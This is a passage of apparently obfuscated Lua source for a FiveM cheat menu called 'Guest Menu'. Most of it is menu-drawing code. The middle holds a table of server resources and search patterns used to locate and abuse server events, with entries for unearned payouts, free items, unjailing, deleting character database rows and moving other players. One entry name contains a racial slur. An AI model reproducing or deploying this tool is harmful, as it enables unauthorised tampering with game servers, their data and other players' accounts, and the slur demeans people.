        end
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount and dk
         then
            if not HasStreamedTextureDictLoaded("shared") then
                I.natives.RequestStreamedTextureDict("shared", true)
            end
            if I.GuestCurrentUI.menu_TextOutline then
            end
        elseif dk then
            if not HasStreamedTextureDictLoaded("shared") then
                I.natives.RequestStreamedTextureDict("shared", true)
            end
            if I.GuestCurrentUI.menu_TextOutline then
            end
        end
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount and
                I.GuestCurrentUI.menu_RectOverlay
         then
            if not HasStreamedTextureDictLoaded("deadline") then
                I.natives.RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "deadline",
                "deadline_trail_01",
                x,
                y,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].width,
                I.GuestCurrentUI.buttonHeight,
                0.0,
                I.mainColor.r,
                I.mainColor.g,
                I.mainColor.b,
                55
            )
        end
    end
end
local ds = 1
function I.drawCheckbox(L, aD)
    local x =
        I.GuestCurrentUI.GuestShit[
        I.GuestCurrentUI.currentMenu
    ].x +
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].width /
            2
    local dn = nil
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].currentOption <=
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].maxOptionCount and
            I.GuestCurrentUI.optionCount <=
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount
     then
        dn = I.GuestCurrentUI.optionCount
    elseif
        I.GuestCurrentUI.optionCount >
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption -
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount and
            I.GuestCurrentUI.optionCount <=
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].currentOption
     then
        dn =
            I.GuestCurrentUI.optionCount -
            (I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption -
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount)
    end
    if dn then
        local y =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].y +
            I.GuestCurrentUI.titleHeight +
            I.GuestCurrentUI.buttonHeight +
            I.GuestCurrentUI.buttonHeight * dn -
            I.GuestCurrentUI.buttonHeight / 2
        local dp = nil
        local dq = nil
        local cH = false
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount
         then
            dp =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuFocusBackgroundColor
            dq =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuFocusTextColor
        else
            dp =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuBackgroundColor
            dq =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuTextColor
            cH = true
        end
        I.DrawRect(
            x,
            y,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].width,
            I.GuestCurrentUI.buttonHeight,
            dp
        )
        I.drawText(
            L,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].x + I.GuestCurrentUI.buttonTextXOffset,
            y - I.GuestCurrentUI.buttonHeight / 2 +
                I.GuestCurrentUI.buttonTextYOffset,
            I.GuestCurrentUI.buttonFont,
            dq,
            I.GuestCurrentUI.buttonScale,
            false,
            cH
        )
        if not HasStreamedTextureDictLoaded("srange_gen") then
            I.natives.RequestStreamedTextureDict("srange_gen", true)
        end
        if not HasStreamedTextureDictLoaded("mptattoos2") then
            I.natives.RequestStreamedTextureDict("mptattoos2", true)
        end
        if not HasStreamedTextureDictLoaded("hunting") then
            I.natives.RequestStreamedTextureDict("hunting", true)
        end
        if not HasStreamedTextureDictLoaded("Guest8") then
            I.natives.RequestStreamedTextureDict("Guest8", true)
        end
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount
         then
            if aD then
                if I.GuestCurrentUI.selectedCheckboxStyle == "New" then
                    DrawSprite(
                        "srange_gen",
                        "hits_dot",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.01375,
                        0.0225,
                        0.0325,
                        0.0,
                        0,
                        255,
                        0,
                        255
                    )
                elseif I.GuestCurrentUI.selectedCheckboxStyle == "Old" then
                    DrawSprite(
                        "srange_gen",
                        "hits_dot",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.0125,
                        0.0325,
                        0.0425,
                        0.0,
                        I.mainColor.r,
                        I.mainColor.g,
                        I.mainColor.b,
                        255
                    )
                end
            else
                if I.GuestCurrentUI.selectedCheckboxStyle == "New" then
                    DrawSprite(
                        "srange_gen",
                        "hits_dot",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.01375,
                        0.0225,
                        0.0325,
                        0.0,
                        255,
                        0,
                        0,
                        255
                    )
                elseif I.GuestCurrentUI.selectedCheckboxStyle == "Old" then
                    DrawSprite(
                        "srange_gen",
                        "hits_dot",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.0125,
                        0.0325,
                        0.0425,
                        0.0,
                        I.mainColor.r,
                        I.mainColor.g,
                        I.mainColor.b,
                        255
                    )
                end
            end
        else
            if aD then
                if I.GuestCurrentUI.selectedCheckboxStyle == "New" then
                    DrawSprite(
                        "srange_gen",
                        "hits_dot",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.01375,
                        0.0225,
                        0.0325,
                        0.0,
                        0,
                        255,
                        0,
                        255
                    )
                elseif I.GuestCurrentUI.selectedCheckboxStyle == "Old" then
                    DrawSprite(
                        "mptattoos2",
                        "shop_box_tick",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.0125,
                        0.0325,
                        0.0425,
                        0.0,
                        155,
                        155,
                        155,
                        255
                    )
                end
            else
                if I.GuestCurrentUI.selectedCheckboxStyle == "New" then
                    DrawSprite(
                        "srange_gen",
                        "hits_dot",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.01375,
                        0.0225,
                        0.0325,
                        0.0,
                        255,
                        0,
                        0,
                        255
                    )
                elseif I.GuestCurrentUI.selectedCheckboxStyle == "Old" then
                    DrawSprite(
                        "mptattoos2",
                        "shop_box_blank",
                        I.GuestCurrentUI.GuestShit[
                            I.GuestCurrentUI.currentMenu
                        ].x +
                            I.GuestCurrentUI.buttonTextXOffset +
                            0.235,
                        y - I.GuestCurrentUI.buttonHeight / 2 +
                            I.GuestCurrentUI.buttonTextYOffset +
                            0.0125,
                        0.0325,
                        0.0425,
                        0.0,
                        155,
                        155,
                        155,
                        255
                    )
                end
            end
        end
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount and
                I.GuestCurrentUI.menu_RectOverlay
         then
            if not HasStreamedTextureDictLoaded("deadline") then
                I.natives.RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "deadline",
                "deadline_trail_01",
                x,
                y,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].width,
                I.GuestCurrentUI.buttonHeight,
                0.0,
                I.mainColor.r,
                I.mainColor.g,
                I.mainColor.b,
                55
            )
        end
    end
end
function I.GuestMenuCreating(aW, dt)
    d.Main.GuestTable.GuestInsert(
        I.menus_list,
        aW
    )
    I.GuestCurrentUI.GuestShit[aW] = {}
    I.GuestCurrentUI.GuestShit[aW].title = dt
    I.GuestCurrentUI.GuestShit[aW].subTitle =
        "Guest Menu!"
    I.GuestCurrentUI.GuestShit[aW].visible = false
    I.GuestCurrentUI.GuestShit[aW].previousMenu = nil
    I.GuestCurrentUI.GuestShit[aW].aboutToBeClosed = false
    I.GuestCurrentUI.GuestShit[aW].x = 0.0175
    I.GuestCurrentUI.GuestShit[aW].y = 0.025
    I.GuestCurrentUI.GuestShit[aW].width = 0.23
    I.GuestCurrentUI.GuestShit[aW].currentOption = 1
    I.GuestCurrentUI.GuestShit[aW].maxOptionCount =
        I.GuestCurrentUI.maximumOptionCount
    I.GuestCurrentUI.GuestShit[aW].titleFont = 1
    I.GuestCurrentUI.GuestShit[aW].titleColor = {
        r = 0,
        g = 0,
        b = 0,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].titleBackgroundColor = {
        r = 0,
        g = 0,
        b = 0,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].titleBackgroundSprite = nil
    I.GuestCurrentUI.GuestShit[aW].menuTextColor = {
        r = 255,
        g = 255,
        b = 255,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].menuSubTextColor = {
        r = 0,
        g = 0,
        b = 0,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].menuFocusTextColor = {
        r = 155,
        g = 155,
        b = 155,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].menuFocusBackgroundColor = {
        r = 0,
        g = 0,
        b = 0,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].menuBackgroundColor = {
        r = 55,
        g = 55,
        b = 55,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].subTitleBackgroundColor = {
        r = 35,
        g = 35,
        b = 35,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].subTitleTextColor = {
        r = I.mainColor.r,
        g = I.mainColor.g,
        b = I.mainColor.b,
        a = 255
    }
    I.GuestCurrentUI.GuestShit[aW].buttonPressedSound = {
        name = "SELECT",
        set = "HUD_FRONTEND_DEFAULT_SOUNDSET"
    }
    I.c6b66f5c83c5739fa64558753033d13(
        d.Main.GuestToString(aW) .. " menu created"
    )
end
function I.MenuSubCreating(aW, du, dv)
    if I.GuestCurrentUI.GuestShit[du] then
        I.GuestMenuCreating(
            aW,
            I.GuestCurrentUI.GuestShit[du].title
        )
        if dv then
            I.setMenuProperty(aW, "subTitle", dv)
        else
            I.setMenuProperty(
                aW,
                "subTitle",
                I.GuestCurrentUI.GuestShit[du].subTitle
            )
        end
        I.setMenuProperty(aW, "previousMenu", du)
        I.setMenuProperty(
            aW,
            "x",
            I.GuestCurrentUI.GuestShit[du].x
        )
        I.setMenuProperty(
            aW,
            "y",
            I.GuestCurrentUI.GuestShit[du].y
        )
        I.setMenuProperty(
            aW,
            "maxOptionCount",
            I.GuestCurrentUI.GuestShit[du].maxOptionCount
        )
        I.setMenuProperty(
            aW,
            "titleFont",
            I.GuestCurrentUI.GuestShit[du].titleFont
        )
        I.setMenuProperty(
            aW,
            "titleColor",
            I.GuestCurrentUI.GuestShit[du].titleColor
        )
        I.setMenuProperty(
            aW,
            "titleBackgroundColor",
            I.GuestCurrentUI.GuestShit[du].titleBackgroundColor
        )
        I.setMenuProperty(
            aW,
            "titleBackgroundSprite",
            I.GuestCurrentUI.GuestShit[du].titleBackgroundSprite
        )
        I.setMenuProperty(
            aW,
            "menuTextColor",
            I.GuestCurrentUI.GuestShit[du].menuTextColor
        )
        I.setMenuProperty(
            aW,
            "menuSubTextColor",
            I.GuestCurrentUI.GuestShit[du].menuSubTextColor
        )
        I.setMenuProperty(
            aW,
            "menuFocusTextColor",
            I.GuestCurrentUI.GuestShit[du].menuFocusTextColor
        )
        I.setMenuProperty(
            aW,
            "menuFocusBackgroundColor",
            I.GuestCurrentUI.GuestShit[du].menuFocusBackgroundColor
        )
        I.setMenuProperty(
            aW,
            "menuBackgroundColor",
            I.GuestCurrentUI.GuestShit[du].menuBackgroundColor
        )
        I.setMenuProperty(
            aW,
            "subTitleBackgroundColor",
            I.GuestCurrentUI.GuestShit[du].subTitleBackgroundColor
        )
    else
        I.c6b66f5c83c5739fa64558753033d13(
            "Failed to create " ..
                d.Main.GuestToString(aW) ..
                    " submenu: " ..
                        d.Main.GuestToString(du) ..
                            " parent menu doesn't exist"
        )
    end
end
function I.openMenu(aW)
    if aW and I.GuestCurrentUI.GuestShit[aW] then
        I.e1f7840a0e42a66ce28aaf37700(aW, true)
        I.c6b66f5c83c5739fa64558753033d13(
            d.Main.GuestToString(aW) .. " menu opened"
        )
    else
        I.c6b66f5c83c5739fa64558753033d13(
            "Failed to open " ..
                d.Main.GuestToString(aW) ..
                    " menu: it doesn't exist"
        )
    end
end
function I.isMenuOpened(aW)
    return I.isMenuVisible(aW)
end
function I.isAnyMenuOpened()
    for aW, cd in pairs(I.GuestCurrentUI.GuestShit) do
        if I.isMenuVisible(aW) then
            return true
        end
    end
    return false
end
function I.isMenuAboutToBeClosed()
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        e8ae1a79d1d9cbb6(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        return I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].aboutToBeClosed
    else
        return false
    end
end
function I.ba324546()
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].aboutToBeClosed
         then
            I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].aboutToBeClosed = false
            I.e1f7840a0e42a66ce28aaf37700(I.GuestCurrentUI.currentMenu, false)
            I.c6b66f5c83c5739fa64558753033d13(
                d.Main.GuestToString(
                    I.GuestCurrentUI.currentMenu
                ) .. " menu closed"
            )
            I.GuestCurrentUI.optionCount = 0
            I.GuestCurrentUI.currentMenu = nil
            I.GuestCurrentUI.currentKey = nil
        else
            I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].aboutToBeClosed = true
            I.c6b66f5c83c5739fa64558753033d13(
                d.Main.GuestToString(
                    I.GuestCurrentUI.currentMenu
                ) .. " menu about to be closed"
            )
        end
    end
end
local dw = {
    {
        resource = "esx_vangelico_robbery",
        resourcelooklike = {"vangelico", "jewlery"},
        file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
        lookfor = "ClearPedTasksImmediately.GetPlayerPed.-1..",
        name = "vangelico_get",
        noparam = true
    },
    {
        resource = "esx_vangelico_robbery",
        resourcelooklike = {"vangelico", "jewlery"},
        file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
        lookfor = "FreezeEntityPosition.playerPed, false.",
        name = "vangelico_sell",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'CokeField' then",
        name = "coke_feild",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'CokeProcessing' then",
        name = "coke_process",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'CokeDealer' then",
        name = "coke_sell",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'MethField' then",
        name = "meth_field",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'MethProcessing' then",
        name = "meth_process",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'MethDealer' then",
        name = "meth_sell",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'WeedField' then",
        name = "weed_field",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'WeedProcessing' then",
        name = "weed_process",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'WeedDealer' then",
        name = "weed_sell",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'OpiumField' then",
        name = "opium_field",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'OpiumProcessing' then",
        name = "opium_process",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "elseif CurrentAction == 'OpiumDealer' then",
        name = "opium_sell",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "CurrentAction = nil",
        name = "stop_feild_coke",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "estCoke",
        name = "stop_process_coke",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "sformCoke",
        name = "stop_sell_coke",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "stopSell",
        name = "stop_feild_meth",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "tMeth",
        name = "stop_process_meth",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "sformMeth",
        name = "stop_sell_meth",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "stopSellM",
        name = "stop_feild_weed",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "vestWeed",
        name = "stop_process_weed",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "ransformWeed",
        name = "stop_sell_weed",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "stopSellW",
        name = "stop_feild_opium",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "stopHarvest",
        name = "stop_process_opium",
        noparam = true
    },
    {
        resource = "drugs",
        resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
        file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
        lookfor = "formOpium",
        name = "stop_sell_opium",
        noparam = true
    },
    {
        resource = "esx_dmvschool",
        resourcelooklike = {"dmvschool"},
        file = {"client/main.lua"},
        lookfor = ", Config.Prices%b[]",
        name = "dmv_pay",
        noparam = false
    },
    {
        resource = "esx_dmvschool",
        resourcelooklike = {"dmvschool"},
        file = {"client/main.lua"},
        lookfor = ", %b''",
        name = "dmv_getlicense",
        noparam = false
    },
    {
        resource = "gcphone",
        file = {"client/twitter.lua"},
        resourcelooklike = {"phone"},
        lookfor = ", data.username or '', data.password or '', data.message",
        name = "gcphone_posttweet",
        noparam = false
    },
    {
        resource = "gcphone",
        file = {"client/twitter.lua"},
        resourcelooklike = {"phone"},
        lookfor = ", data.username, data.password, data.avatarUrl",
        name = "gcphone_createtwiteracc",
        noparam = false
    },
    {
        resource = "gcphone",
        file = {"client/twitter.lua"},
        resourcelooklike = {"phone"},
        lookfor = ", data.username, data.password",
        name = "gcphone_logintwitteracc",
        noparam = false
    },
    {
        resource = "esx_vehicleshop",
        resourcelooklike = {"vehicle"},
        file = {"client/main.lua"},
        lookfor = ", vehicleProps",
        name = "vehicleshop_ownedveh",
        noparam = false
    },
    {
        resource = "esx_policejob",
        resourcelooklike = {"police"},
        file = {"client/main.lua"},
        lookfor = ", GetPlayerServerId%b(),",
        name = "police_exploit",
        noparam = false
    },
    {
        resource = "CarryPeople",
        resourcelooklike = {"carry"},
        file = {"cl_carry.lua"},
        lookfor = ", closestPlayer,",
        name = "carry_exploit",
        noparam = false
    },
    {
        resource = "CarryPeople",
        resourcelooklike = {"carry"},
        file = {"cl_carry.lua"},
        lookfor = ",target",
        name = "carrypeople_stop",
        noparam = false
    },
    {
        resource = "esx-qalle-jail",
        resourcelooklike = {"jail"},
        file = {"client/client.lua"},
        lookfor = ", function%(newJailTime%)",
        name = "qalle_jailer",
        noparam = false
    },
    {
        resource = "esx_policejob",
        resourcelooklike = {"police"},
        file = {"client/main.lua"},
        lookfor = ", player, c",
        name = "community",
        noparam = false
    },
    {
        resource = "esx_truckerjob",
        resourcelooklike = {"trucker"},
        file = {"client/main.lua"},
        lookfor = ", amount",
        name = "truckerjob_pay",
        noparam = false
    },
    {
        resource = "gopostal_job",
        resourcelooklike = {"gopostal"},
        file = {"client/cl.lua"},
        lookfor = ", currentJobPay",
        name = "gopostal_pay",
        noparam = false
    },
    {
        resource = "esx-qalle-jail",
        resourcelooklike = {"jail"},
        file = {"client/client.lua"},
        lookfor = ", jailTime%)",
        name = "qalle_unjail",
        noparam = false
    },
    {
        resource = "esx_status",
        resourcelooklike = {"status"},
        file = {"client/main.lua"},
        lookfor = ", function%(name, val%)",
        name = "esx_status_refillstatus",
        noparam = false
    },
    {
        resource = "esx_policejob",
        resourcelooklike = {"police"},
        file = {"client/main.lua"},
        lookfor = ", GetPlayerServerId%b(), 'society_police', _U%b(), data.current.amount",
        name = "send_bill",
        noparam = false
    },
    {
        resource = "ESX_a0c3c7c65448d332b391432b870632",
        resourcelooklike = {"a0c3c7c65448d332b391432b870632"},
        file = {"client/main.lua"},
        lookfor = ", function%(source%)",
        name = "a0c3c7c65448d332b391432b870632_finishservice",
        noparam = false
    },
    {
        resource = "esx_garbagejob",
        resourcelooklike = {"garbage"},
        file = {"client/main.lua"},
        lookfor = ", amount%)",
        name = "garbagejob_pay",
        noparam = false
    },
    {
        resource = "TakeHostage",
        resourcelooklike = {"hostage"},
        file = {"cl_takehostage.lua"},
        lookfor = ", closestPlayer,",
        name = "Hostage_Exploit",
        noparam = false
    },
    {
        resource = "esx_moneywash",
        resourcelooklike = {"wash"},
        file = {"client/main.lua"},
        lookfor = ", amount, zone",
        name = "Money_Wash",
        noparam = false
    },
    {
        resource = "esx_moneywash",
        resourcelooklike = {"wash"},
        file = {"config.lua"},
        lookfor = "%] = %{",
        name = "Money_Wash_Zone",
        noparam = false
    },
    {
        resource = "esx_moneywash",
        resourcelooklike = {"wash"},
        file = {"client/main.lua"},
        lookfor = ", amount",
        name = "Money_Wash_Old",
        noparam = false
    },
    {
        resource = "esx_kashacters",
        resourcelooklike = {"kashacters"},
        file = {"client/main.lua"},
        lookfor = ", data.charid%)",
        name = "delete_DB",
        noparam = false
    },
    {
        resource = "esx_bus",
        resourcelooklike = {"bus"},
        file = {"client/main.lua"},
        lookfor = ", amount%)",
        name = "buss_pay",
        noparam = false
    },
    {
        resource = "99kr-burglary",
        resourcelooklike = {"burglary"},
        file = {"burglary_client.lua"},
        lookfor = ", values.item, rndm%)",
        name = "free_items",
        noparam = false
    },
    {
        resource = "es_extended",
        resourcelooklike = {"extended"},
        file = {"client/common.lua"},
        lookfor = ", function%(cb%)",
        name = "esx_hook",
        noparam = false
    },
    {
        resource = "Badger_Tackle",
        resourcelooklike = {"tackle"},
        file = {"client/main.lua"},
        lookfor = ", GetPlayerServerId%(closestPlayer%)",
        name = "tp_all_to_me",
        noparam = false
    },
    {
        resource = "dp-emotes",
        resourcelooklike = {"emotes", "emote", "dpemotes"},
        file = {"client/Syncing.lua"},
        lookfor = ", GetPlayerServerId%(target%), requestedemote, otheremote",
        name = "emote_nigger",
        noparam = false
    },
    {
        resource = "rl-inventory",
        resourcelooklike = {"inventory"},
        file = {"client/main.lua"},
        lookfor = ', "trunk", CurrentVehicle, other',
        name = "open_inv_ghetto",
        noparam = false
    },
    {
        resource = "esx_hifi",
        resourcelooklike = {"hifi", "esx-hifi", "esx-sound", "esx_sound", "sound"},
        file = {"client/main.lua", "client.lua"},
        lookfor = ", data.value, coords",
        name = "play_da_sound",
        noparam = false
    }
}
function I.button(L, dl, dm)
    local dx = L
    if dl then
        dx =
            "{ " ..
            d.Main.GuestToString(dx) ..
                ", " .. d.Main.GuestToString(dl) .. " }"
    end
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        I.GuestCurrentUI.optionCount =
            I.GuestCurrentUI.optionCount + 1
        local dy =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].currentOption == I.GuestCurrentUI.optionCount
        I.drawButton(false, L, dl, dm)
        if dy then
            if
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.select
             then
                I.natives.e8ae1a79d1d9cbb6(
                    -1,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.name,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].buttonPressedSound.set,
                    true
                )
                I.c6b66f5c83c5739fa64558753033d13(dx .. " button pressed")
                return true
            elseif
                I.GuestCurrentUI.currentKey ==
                    I.GuestCurrentUI.keys.left or
                    I.GuestCurrentUI.currentKey ==
